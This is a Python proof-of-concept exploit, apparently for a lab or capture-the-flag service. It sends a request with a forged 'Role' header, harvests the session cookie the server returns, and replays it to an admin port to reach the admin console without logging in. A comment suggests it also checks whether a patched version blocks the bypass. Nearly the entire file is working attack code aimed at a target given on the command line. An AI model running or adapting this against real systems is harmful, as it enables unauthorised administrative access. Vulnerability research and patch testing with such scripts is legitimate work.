import sys
import errno
import os
import socket

def send_payload1(s1, status_line, HOST, HTTP_PORT):

    header = 'Role:' + ' ' + 'ANONYMOUS2\r\n\r\n'

    payload = status_line + header

    s1.connect((HOST , HTTP_PORT))

    print(payload)

    s1.send(bytes(payload, 'utf-8'))

    response = str(s1.recv(500))

    s1.close()

    return response


def grab_admin_cookie(response):
    cookie_start = response.find('Set-Cookie:')

    cookie_header = 'Cookie: '

    admin_cookie = str(cookie_header) + str(response[cookie_start + 12:cookie_start + 11 + 33])

    print(admin_cookie + '\n\n')

    return admin_cookie

def send_payload2(s2, status_line, cookie_header, HOST, ADMIN_PORT):

    payload2 = (str(status_line) + str(cookie_header)+ '\r\n\r\n')

    s2.connect((HOST , ADMIN_PORT))

    s2.send(bytes(payload2, 'utf-8'))

    print(payload2)

    admin_response = s2.recv(750).decode('utf-8')
    
    return admin_response

def main():

    if(len(sys.argv) == 5):
        HOST = sys.argv[1]
        ADMIN_PORT = int(sys.argv[2])
        HTTP_PORT = int(sys.argv[3])
        URI = sys.argv[4]

    elif('HOST' in os.environ and 'ADMIN_PORT' in os.environ and 'HTTP_PORT' in os.environ and 'URI' in os.environ):
        HOST = os.environ['HOST']
        ADMIN_PORT = int(os.environ['ADMIN_PORT'])
        HTTP_PORT = int(os.environ['HTTP_PORT'])
        URI = os.environ['URI']

    else:
        print('[ERROR] target and port must be specified via arguments or variables.') 
        sys.exit()

    s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    status_line = 'GET' + ' ' + URI + ' ' + 'HTTP/1.1\r\n'

    response = send_payload1(s1, status_line, HOST, HTTP_PORT)

    admin_cookie = grab_admin_cookie(response)

    admin_response = send_payload2(s2, status_line, admin_cookie, HOST, ADMIN_PORT)

    print(admin_response)

    #For patched version should be a broken pipe
    try:
        s2.send(bytes('1', 'utf-8'))
    except:
        print('Huh')
    
    
    s2.send(bytes('4','utf-8'))

    s2.close()

    if(admin_response[4:50] == '---------Welcome to the Admin Console---------'):
        print('Got access to the admin console without authing as admin user!')

    else:
        print('Failure')

if __name__ == '__main__':
    main()
